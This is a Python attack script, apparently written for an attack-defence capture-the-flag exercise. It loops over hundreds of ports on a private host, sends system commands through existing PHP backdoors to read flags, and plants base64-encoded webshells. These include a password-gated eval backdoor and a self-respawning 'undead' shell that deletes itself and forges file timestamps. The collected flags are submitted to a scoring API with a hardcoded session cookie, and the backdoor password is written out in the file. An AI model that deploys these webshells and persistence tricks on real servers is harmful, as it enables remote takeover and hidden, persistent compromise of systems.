#coding=gbk
import sys
import requests
import re
import json

url = "http://10.12.153.73"
ports =[13357, 13703, 13505, 13819, 13381, 13589, 14008, 13497, 13747, 13621, 13423, 13495, 13509, 13773, 13779, 13527, 13403, 13817, 13725, 13843, 13797, 13421, 13994, 13647, 13984, 13829, 13653, 13825, 13821, 13559, 14006, 14107, 13561, 13461, 13998, 13839, 13539, 13389, 13613, 13585, 13537, 13869, 13623, 13525, 13475, 13865, 13879, 13683, 13837, 13449, 13583, 13867, 13375, 13425, 13851, 13729, 13639, 13649, 13453, 13855, 13853, 13433, 13719, 13657, 13805, 13775, 13593, 13801, 13881, 13553, 13743, 13465, 13735, 13741, 13813, 13531, 13533, 13437, 13611, 13675, 13551, 13815, 13549, 13415, 13427, 13391, 13507, 13373, 13359, 14016, 13481, 13451, 13535, 13737, 13543, 13487, 13617, 13529, 13399, 13393, 13377, 13369, 13471, 13807, 13709, 13777, 13783, 13707, 13665, 13429, 13441, 13791, 13557, 13601, 13431, 13857, 13625, 13573, 13988, 13607, 14012, 13401, 13519, 13361, 13799, 13413, 13521, 13419, 13795, 13873, 13751, 13489, 13809, 13785, 13477, 13379, 13667, 13511, 13861, 13499, 13541, 13827, 13371, 13569, 13691, 13753, 13459, 13515, 13863, 13483, 13835, 13417, 13833, 13435, 14032, 13787, 13831, 13439, 13823, 13781, 13789, 13473, 13793, 13469, 13355, 13467, 13803, 13463, 13811, 13455, 13447, 13443, 13457, 13841, 13845, 13365, 13990, 13992, 13363, 13996, 14000, 14002, 14004, 14010, 13351, 14014, 13349, 14020, 14022, 14024, 14026, 14028, 13986, 13367, 13847, 13849, 13411, 13409, 13407, 13859, 13397, 13385, 13383, 13875, 13877, 13883, 13885, 13974, 13976, 13980, 13982, 14030, 13599, 13641, 13643, 13567, 13565, 13651, 13563, 13655, 13555, 13659, 13663, 13547, 13669, 13671, 13673, 13545, 13677, 13679, 13597, 13637, 13595, 13603, 13605, 13591, 13609, 13587, 13581, 13579, 13619, 13577, 13575, 13571, 13627, 13629, 13631, 13633, 13635, 13681, 13685, 13485, 13731, 13733, 13501, 13739, 13347, 13493, 13749, 13755, 13757, 13759, 13767, 13761, 13763, 13765, 13769, 13771, 13491, 13513, 13727, 13697, 13699, 13701, 13523, 13705, 13695, 13693, 13711, 13713, 13715, 13687, 13745, 13723, 13721, 13689, 13717, 14115, 14113, 14105, 14121, 14127, 14117, 14123]

''' 拉屎大王
<?php
    ignore_user_abort(true);
    set_time_limit(0);
    unlink(__FILE__);
    $file = '.settings.php';
    $code = '<?php if(md5($_GET["pass"])=="9ff435c9ab3b1dff7628303bcff35e99"){@eval($_POST[a]);} ?>';
    while(1){
        file_put_contents($file,$code);
        system('touch -m -d "2018-12-01 09:10:12" .settings.php');
        usleep(10000);
    }
?>
.settings.php
pass=e0!}W93q2eurUS87edehjd9dl;[po2e
'''

'''  加了md5验证的后门       .server.php      '''
shell1_64 = "PD9waHAgaWYobWQ1KCRfR0VUWyJwYXNzIl0pPT0iOWZmNDM1YzlhYjNiMWRmZjc2MjgzMDNiY2ZmMzVlOTkiKXtAZXZhbCgkX1BPU1RbYV0pO30gPz4="
webshell1 = "system('echo \"" + shell1_64 + "\" | base64 -d > .server.php');"

'''  不死马，生成md5验证后门  .settings.php    '''
shell2_64 = "PD9waHAKICAgIGlnbm9yZV91c2VyX2Fib3J0KHRydWUpOwogICAgc2V0X3RpbWVfbGltaXQoMCk7CiAgICB1bmxpbmsoX19GSUxFX18pOwogICAgJGZpbGUgPSAnLnNldHRpbmdzLnBocCc7CiAgICAkY29kZSA9ICc8P3BocCBpZihtZDUoJF9HRVRbInBhc3MiXSk9PSI5ZmY0MzVjOWFiM2IxZGZmNzYyODMwM2JjZmYzNWU5OSIpe0BldmFsKCRfUE9TVFthXSk7fSA/Pic7CiAgICB3aGlsZSgxKXsKICAgICAgICBmaWxlX3B1dF9jb250ZW50cygkZmlsZSwkY29kZSk7CiAgICAgICAgc3lzdGVtKCd0b3VjaCAtbSAtZCAiMjAxOC0xMi0wMSAwOToxMDoxMiIgLnNldHRpbmdzLnBocCcpOwogICAgICAgIHVzbGVlcCgxMDAwMCk7CiAgICB9Cj8+"
webshell2 = "system('echo \"" + shell2_64 + "\" | base64 -d > config.php');"



'''  不死马，生成rsa后门      .rsa_server.php '''
# shell3_64 = "PD9waHAKICAgIHNldF90aW1lX2xpbWl0KDApOwogICAgaWdub3JlX3VzZXJfYWJvcnQoMSk7CiAgICB1bmxpbmsoX19GSUxFX18pOwogICAgJHNoZWxsPSc8P3BocApjbGFzcyBSc2Ege3ByaXZhdGUgc3RhdGljICRQVUJMSUNfS0VZPSAiLS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlHZk1BMEdDU3FHU0liM0RRRUJBUVVBQTRHTkFEQ0JpUUtCZ1FDckZ4eUFZR3FERTlPUjNDTlBFakdwUURBYwpJY3NjOVpHLzJIUGd6SHNNRThuNDV4MXlQNzVLaTBNSVlqNHVob3lnb1lsblpQazNnS2o2MEdkTThvRDdodkw2ClIyNExaaWoweml4UnorbUJVL3hhYytkSkhJSy81eEFNdG5RZXlXY3UrUU1TTEFyRGxuOVd4cDdubU9OQTFSeTUKNGlYNGlKMVBWT0R0dy9CWmJRSURBUUFCCi0tLS0tRU5EIFBVQkxJQyBLRVktLS0tLQoiOwogICAgcHJpdmF0ZSBzdGF0aWMgZnVuY3Rpb24gZ2V0UHVibGljS2V5KCkKICAgIHsKICAgICAgICAkcHVibGljS2V5ID0gc2VsZjo6JFBVQkxJQ19LRVk7CiAgICAgICAgcmV0dXJuIG9wZW5zc2xfcGtleV9nZXRfcHVibGljKCRwdWJsaWNLZXkpOwogICAgfQoKICAgIHB1YmxpYyBzdGF0aWMgZnVuY3Rpb24gcHVibGljRGVjcnlwdCgkZW5jcnlwdGVkID0gIiIpCiAgICB7CiAgICAgICAgaWYgKCFpc19zdHJpbmcoJGVuY3J5cHRlZCkpIHsKICAgICAgICAgICAgcmV0dXJuIG51bGw7CiAgICAgICAgfQogICAgICAgIHJldHVybiAob3BlbnNzbF9wdWJsaWNfZGVjcnlwdChiYXNlNjRfZGVjb2RlKCRlbmNyeXB0ZWQpLCAkZGVjcnlwdGVkLCBzZWxmOjpnZXRQdWJsaWNLZXkoKSkpID8gJGRlY3J5cHRlZCA6IG51bGw7CiAgICB9Cn0KJGNtZD0kX1BPU1RbYV07CiRyc2EgPSBuZXcgUnNhKCk7CiRwdWJsaWNEZWNyeXB0ID0gJHJzYS0+cHVibGljRGVjcnlwdCgkY21kKTsKJHJlcz1ldmFsKCRwdWJsaWNEZWNyeXB0KTsnCiAgICA7CiAgICB3aGlsZSgxKXsKICAgIGZpbGVfcHV0X2NvbnRlbnRzKCcucnNhX3NlcnZlci5waHAnLCRzaGVsbCk7CiAgICBzeXN0ZW0oJ2NobW9kIDc3NyAucnNhX3NlcnZlci5waHAnKTsKICAgIH0KPz4="
# webshell3 = "system('echo \"" + shell3_64 + "\" | base64 -d > rsa_server.php');"


def upload_shell(url, shell, passwd, webshell):
    # with open("log_upload_shell.txt", "w") as f:
        # sys.stdout = f
        for port in ports:
            url1 = url + ":" + str(port) + shell
            newshell = {
                passwd: webshell
            }
            i = 0
            j = 0
            try:
                requests.post(url1, newshell, timeout=1)
                print("[{}] [ {} ] shell upload success!".format(i, url1))
            except:
                print("[{}] [ {} ] shell upload failed!".format(j, url1))
                continue
            try:
                url2 = url + ":" + str(port) + "/static/runtime.php"
                requests.get(url2, timeout=0.2)
            except:
                continue
    # sys.stdout = sys.__stdout__


def shell_post(url, shell, payload):
    with open("./flags.txt", "w") as f:
        for port in ports:
            url1 = url + ':' + str(port) + shell

            try:
                response = requests.post(url1, payload, timeout=1)
                text = response.text

                pattern = r'awd\{.*?\}'
                matches = re.findall(pattern, text)
                for match in matches:
                    print(match)
                    f.write(match+'\n')
            except:
                continue


def shell_get(url, shell, payload):
    with open("./flags.txt", "w") as f:
        sys.stdout = f
        for port in ports:
            url1 = url + ':' + str(port) + shell

            try:
                response = requests.get(url1, payload, timeout=1)
                text = response.text

                pattern = r'awd\{.*?\}'
                matches = re.findall(pattern, text)
                for match in matches:
                    print(match)
            except:
                continue
    sys.stdout = sys.__stdout__


def submit():
    url = 'https://10.12.153.99:443/api/student/awd/flag'
    headers = {
        'Content-Type': 'application/json',
        'Cookie': 'SESSIONID=MTczMzQ2NzUzNHxOd3dBTkVsRVYxZFZTMXBXU1ZST05VWldNMVpaVVVSU1REVlVXRmRTUVU1TFZWUlpNa1pJVlVreVVVcEVNazVTV1VKSFZFUTNTMEU9fENpxgQZDyGd10ry6gl3ZjmVxRPZDBDfnE67ZcgOmTlz'
    }
    with open('./flags.txt', 'r') as file:
        flags = file.readlines()

    flags = [flag.strip() for flag in flags]
    for flag in flags:
        data = {
            "courseID": 725,
            "flag": flag
        }
        try:
            response = requests.put(url, headers=headers, data=json.dumps(data), verify=False)
            print("Flag {} submitted with status code: {}".format(flag, response.status_code))
            print("Response:", response.text)
        except requests.exceptions.RequestException as e:
            print("An error occurred while submitting flag {}: {}".format(flag, e))


if __name__ == '__main__':
    
    shell0 = '/404.php'
    passwd0 = 'M'
    catflag0 = {
        passwd0: 'system(\'cat /flag\');'
    }
    shell_post(url, shell0, catflag0)
    
    '''  加了md5验证的后门       .server.php      '''
    # shell1_64 = "PD9waHAgaWYobWQ1KCRfR0VUWyJwYXNzIl0pPT0iOWZmNDM1YzlhYjNiMWRmZjc2MjgzMDNiY2ZmMzVlOTkiKXtAZXZhbCgkX1BPU1RbYV0pO30gPz4="
    # webshell1 = "system('echo \"" + shell1_64 + "\" | base64 -d > .server.php');"
    
    upload_shell('http://10.12.153.73', shell0, passwd0, webshell1)

    


    shell1 = '/.server.php?pass=e0!}W93q2eurUS87edehjd9dl;[po2e'
    passwd1 = 'a'
    catflag1 = {
        passwd1: 'system(\'cat /flag\');'
    }
    shell_post(url, shell1, catflag1)
    submit()
    
    '''  不死马，生成md5验证后门  .settings.php    '''
    # shell2_64 = "PD9waHAKICAgIGlnbm9yZV91c2VyX2Fib3J0KHRydWUpOwogICAgc2V0X3RpbWVfbGltaXQoMCk7CiAgICB1bmxpbmsoX19GSUxFX18pOwogICAgJGZpbGUgPSAnLnNldHRpbmdzLnBocCc7CiAgICAkY29kZSA9ICc8P3BocCBpZihtZDUoJF9HRVRbInBhc3MiXSk9PSI5ZmY0MzVjOWFiM2IxZGZmNzYyODMwM2JjZmYzNWU5OSIpe0BldmFsKCRfUE9TVFthXSk7fSA/Pic7CiAgICB3aGlsZSgxKXsKICAgICAgICBmaWxlX3B1dF9jb250ZW50cygkZmlsZSwkY29kZSk7CiAgICAgICAgc3lzdGVtKCd0b3VjaCAtbSAtZCAiMjAxOC0xMi0wMSAwOToxMDoxMiIgLnNldHRpbmdzLnBocCcpOwogICAgICAgIHVzbGVlcCgxMDAwMCk7CiAgICB9Cj8+"
    # webshell2 = "system('echo \"" + shell2_64 + "\" | base64 -d > config.php');"
    
    upload_shell('http://10.12.153.73', shell1, passwd1, webshell2)

    gift = 'PD9waHAgaWYobWQ1KCRfR0VUWyJwYXNzIl0pPT0iZDQ1NTRhOTBkNDBhMmVmNTRlMzZlYTIzODY1MzM2ZGIiKXtAZXZhbCgkX1BPU1RbYV0pO30gPz4='
    webshell_gift = "system('echo \"" + gift + "\" | base64 -d > gift.php');"
    upload_shell('http://10.12.153.73', shell1, passwd1, webshell_gift)


    # upload_shell('http://10.12.153.73', shell1, passwd1, webshell2)
    shell2 = '/.settings.php?pass=e0!}W93q2eurUS87edehjd9dl;[po2e'
    passwd2 = 'a'
    catflag2 = {
        passwd2: 'system(\'cat /flag\');'
    }

    # upload_shell('http://10.12.153.73', shell1, passwd1, webshell3)
    # shell3 = ('/.rsa_server.php')
    # passwd3 = 'a'

    # submit()
    # shell_post(url, shell2, catflag2)
    # submit()

    shell3 = '/static/.settings.php?pass=e0!}W93q2eurUS87edehjd9dl;[po2e'
    passwd3 = 'a'
    catflag3 = {
        passwd3: 'system(\'cat /flag\');'
    }


    shell_n = '/.server.php?pass=e0!}W93q2eurUS87edehjd9dl;[po2e'
    passwd_n = 'a'
    catflag_n = {
        passwd_n: 'system(\'cat /flag\');'
    }
    shelln_64 = "PD9waHAKICAgIGlnbm9yZV91c2VyX2Fib3J0KHRydWUpOwogICAgc2V0X3RpbWVfbGltaXQoMCk7CiAgICB1bmxpbmsoX19GSUxFX18pOwogICAgJGZpbGUgPSAnLnNldHRpbmdzLnBocCc7CiAgICAkY29kZSA9ICc8P3BocCBpZihtZDUoJF9HRVRbInBhc3MiXSk9PSI5ZmY0MzVjOWFiM2IxZGZmNzYyODMwM2JjZmYzNWU5OSIpe0BldmFsKCRfUE9TVFthXSk7fSA/Pic7CiAgICB3aGlsZSgxKXsKICAgICAgICBmaWxlX3B1dF9jb250ZW50cygkZmlsZSwkY29kZSk7CiAgICAgICAgc3lzdGVtKCd0b3VjaCAtbSAtZCAiMjAxOC0xMi0wMSAwOToxMDoxMiIgLnNldHRpbmdzLnBocCcpOwogICAgICAgIHVzbGVlcCgxMDAwMCk7CiAgICB9Cj8+"
    webshell_n = "system('echo \"" + shell2_64 + "\" | base64 -d > ./static/runtime.php');"
    shell_post(url, shell2, catflag2)
    # submit()
    # upload_shell('http://10.12.153.73', shell_n, passwd_n, webshell_n)


''' 拉屎大王
<?php
    ignore_user_abort(true);
    set_time_limit(0);
    unlink(__FILE__);
    $file = '.config.php';
    $code = '<?php if(md5($_GET["pass"])=="9ff435c9ab3b1dff7628303bcff35e99"){@eval($_POST[a]);} ?>';
    while(1){
        file_put_contents($file,$code);
        system('touch -m -d "2018-12-01 09:10:12" .config.php');
        usleep(10000);
    }
?>
.settings.php
pass=e0!}W93q2eurUS87edehjd9dl;[po2e
'''